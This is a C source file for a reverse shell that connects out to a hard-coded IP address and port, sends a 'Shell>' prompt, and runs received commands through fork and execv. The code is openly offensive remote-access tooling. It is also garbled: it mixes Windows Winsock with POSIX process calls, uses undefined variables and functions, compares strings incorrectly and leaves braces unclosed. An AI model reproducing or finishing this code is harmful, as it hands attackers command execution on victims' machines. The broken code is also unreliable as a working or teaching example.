#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#define IP_ADDRESS "10.230.229.13"
#define PORT 4445
#define BUF_LEN 1024
#define PAYLOAD_SZ 819200

int main() {
  // Initialize Winsock and use version 2.2
  WSADATA wsaData;
  int wResult;
  WSAStartup(MAKEWORD(2,2), &wsaData);
  
  // Create a socket to connect to an IP and port
  SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  // Define socket type, AF_INET (IPv4), IP address, and port.
  struct sockaddr_in saServer;
  saServer.sin_family = AF_INET;
  saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
  saServer.sin_port = htons(PORT);

  // Connect to socket
  printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
  connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );

  // Receive data from port;
  char buf[BUF_LEN] = "";
  int res = 0;          // Hold return value of recv().
  char prompt = "Shell&gt;"
  
  while (1) {
	// Send the prompt
	send(ConnectSocket, prompt, sizeof(prompt), 0);
	
	// Get a command
    res = recv( ConnectSocket, buf, BUF_LEN, 0 );
	
	if (buf == "quit\n") 
	{ 
	  break; 
	} 
	else
	{
	
	// Fork the process
	int pid = fork();
	
	//Error checking to see if fork works. If pid !=0 then it's the parent.
	if(pid!=0)
	{
	  wait(NULL);
	}
	else
	{
	  //if pid = 0 then we're at the child
	        //Count the number of arguments
	        int num_of_args = countArgs(buffer);
	        //create an array of pointers for the arguments to be passed to execcv.
	        char *arguments[num_of_args+1];
	        //parse the input and arguments will have all the arguments to be passed to the program
	        parse(buffer, num_of_args, arguments);
	        //set the last pointer in the array to NULL. Requirement of execv
	        arguments[num_of_args] = NULL;
	        //This will be the final path to the program that we will pass to execv
	        char prog[512];
	        //First we copy a /bin/ to prog
	        strcpy(prog, path);
	        //Then we concancate the program name to /bin/
	        //If the program name is ls, then it'll be /bin/ls
	        strcat(prog, arguments[0]);
	        //pass the prepared arguments to execv and we're done!
	        int rv = execv(prog, arguments);
	
	
  }

  closesocket(ConnectSocket);
}